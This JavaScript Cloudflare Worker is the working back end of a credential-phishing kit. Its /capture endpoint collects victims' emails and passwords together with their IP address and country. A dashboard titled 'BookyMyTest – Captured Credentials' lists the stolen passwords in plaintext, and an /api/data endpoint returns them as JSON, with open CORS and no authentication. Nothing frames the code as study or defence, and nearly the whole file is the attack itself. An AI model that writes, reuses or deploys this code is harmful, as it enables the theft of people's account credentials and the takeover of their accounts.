// Cloudflare Worker to capture and display credentials
// Deploy using: wrangler deploy

// Simple in-memory storage (clears on worker restart)
// For production, use Cloudflare KV or D1 database
const capturedData = [];

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    };

    // Handle CORS preflight
    if (request.method === 'OPTIONS') {
      return new Response(null, { headers: corsHeaders });
    }

    // Admin Dashboard - View all captured credentials
    if (url.pathname === '/admin' || url.pathname === '/') {
      const html = generateAdminDashboard(capturedData);
      return new Response(html, {
        headers: { 'Content-Type': 'text/html', ...corsHeaders }
      });
    }

    // Capture endpoint - Receives credentials from frontend
    if (url.pathname === '/capture' && request.method === 'POST') {
      try {
        const data = await request.json();
        
        // Verify Turnstile token with Cloudflare
        const turnstileValid = await verifyTurnstile(data.turnstileToken, env.TURNSTILE_SECRET_KEY);
        
        const captureEntry = {
          id: crypto.randomUUID(),
          email: data.email,
          password: data.password,
          timestamp: data.timestamp || new Date().toISOString(),
          userAgent: data.userAgent,
          ip: request.headers.get('CF-Connecting-IP'),
          country: request.cf?.country,
          turnstileVerified: turnstileValid,
          receivedAt: new Date().toISOString()
        };
        
        capturedData.unshift(captureEntry);
        
        // Keep only last 100 entries
        if (capturedData.length > 100) {
          capturedData.pop();
        }
        
        return new Response(JSON.stringify({ success: true }), {
          headers: { 'Content-Type': 'application/json', ...corsHeaders }
        });
      } catch (error) {
        return new Response(JSON.stringify({ error: error.message }), {
          status: 500,
          headers: { 'Content-Type': 'application/json', ...corsHeaders }
        });
      }
    }

    // API endpoint to get captured data as JSON
    if (url.pathname === '/api/data') {
      return new Response(JSON.stringify(capturedData, null, 2), {
        headers: { 'Content-Type': 'application/json', ...corsHeaders }
      });
    }

    return new Response('Not Found', { status: 404 });
  }
};

// Verify Cloudflare Turnstile token
async function verifyTurnstile(token, secretKey) {
  if (!token || !secretKey) return false;
  
  try {
    const response = await fetch('https://challenges.cloudflare.com/turnstile/v0/siteverify', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        secret: secretKey,
        response: token
      })
    });
    
    const result = await response.json();
    return result.success === true;
  } catch {
    return false;
  }
}

// Generate beautiful admin dashboard HTML
function generateAdminDashboard(data) {
  const rows = data.map(entry => `
    <tr>
      <td>${escapeHtml(entry.email)}</td>
      <td class="password-cell">${escapeHtml(entry.password)}</td>
      <td>${formatDate(entry.receivedAt)}</td>
      <td>${entry.ip || 'N/A'}</td>
      <td>${entry.country || 'N/A'}</td>
      <td><span class="badge ${entry.turnstileVerified ? 'success' : 'warning'}">${entry.turnstileVerified ? '✓ Verified' : '⚠ Unverified'}</span></td>
    </tr>
  `).join('');

  return `<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <title>BookyMyTest - Captured Credentials</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
      background: #0f172a;
      color: #e2e8f0;
      padding: 40px;
    }
    .container { max-width: 1400px; margin: 0 auto; }
    h1 {
      font-size: 28px;
      margin-bottom: 8px;
      background: linear-gradient(135deg, #0ea5e9 0%, #22d3ee 100%);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    .subtitle { color: #64748b; margin-bottom: 30px; }
    .stats {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
      gap: 20px;
      margin-bottom: 30px;
    }
    .stat-card {
      background: #1e293b;
      padding: 20px;
      border-radius: 12px;
      border: 1px solid #334155;
    }
    .stat-value {
      font-size: 32px;
      font-weight: 700;
      color: #0ea5e9;
    }
    .stat-label { color: #94a3b8; font-size: 14px; margin-top: 4px; }
    table {
      width: 100%;
      border-collapse: collapse;
      background: #1e293b;
      border-radius: 12px;
      overflow: hidden;
      border: 1px solid #334155;
    }
    th {
      background: #0f172a;
      padding: 16px;
      text-align: left;
      font-weight: 600;
      color: #94a3b8;
      font-size: 12px;
      text-transform: uppercase;
      letter-spacing: 0.5px;
    }
    td {
      padding: 16px;
      border-top: 1px solid #334155;
      font-size: 14px;
    }
    tr:hover td { background: #252f47; }
    .password-cell {
      font-family: 'Courier New', monospace;
      background: #0f172a;
      padding: 8px 12px;
      border-radius: 6px;
      color: #fbbf24;
    }
    .badge {
      display: inline-flex;
      align-items: center;
      gap: 6px;
      padding: 6px 12px;
      border-radius: 20px;
      font-size: 12px;
      font-weight: 500;
    }
    .badge.success { background: #064e3b; color: #34d399; }
    .badge.warning { background: #451a03; color: #fbbf24; }
    .empty-state {
      text-align: center;
      padding: 60px;
      color: #64748b;
    }
    .refresh-btn {
      position: fixed;
      top: 40px;
      right: 40px;
      background: #0ea5e9;
      color: white;
      border: none;
      padding: 12px 24px;
      border-radius: 8px;
      cursor: pointer;
      font-weight: 600;
      transition: all 0.2s;
    }
    .refresh-btn:hover { background: #0284c7; transform: translateY(-2px); }
  </style>
</head>
<body>
  <div class="container">
    <h1>📊 BookyMyTest Dashboard</h1>
    <p class="subtitle">Captured Credentials Viewer</p>
    
    <div class="stats">
      <div class="stat-card">
        <div class="stat-value">${data.length}</div>
        <div class="stat-label">Total Captured</div>
      </div>
      <div class="stat-card">
        <div class="stat-value">${data.filter(e => e.turnstileVerified).length}</div>
        <div class="stat-label">Verified</div>
      </div>
      <div class="stat-card">
        <div class="stat-value">${new Set(data.map(e => e.email)).size}</div>
        <div class="stat-label">Unique Emails</div>
      </div>
    </div>
    
    <button class="refresh-btn" onclick="location.reload()">🔄 Refresh</button>
    
    ${data.length === 0 ? '<div class="empty-state"><h3>No data captured yet</h3><p>Submissions will appear here automatically</p></div>' : `
    <table>
      <thead>
        <tr>
          <th>Email</th>
          <th>Password</th>
          <th>Captured At</th>
          <th>IP Address</th>
          <th>Country</th>
          <th>Status</th>
        </tr>
      </thead>
      <tbody>${rows}</tbody>
    </table>
    `}
  </div>
  <script>setInterval(() => location.reload(), 30000);</script>
</body>
</html>`;
}

function escapeHtml(text) {
  if (!text) return '';
  return text
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&#039;");
}

function formatDate(isoString) {
  if (!isoString) return 'N/A';
  const date = new Date(isoString);
  return date.toLocaleString();
}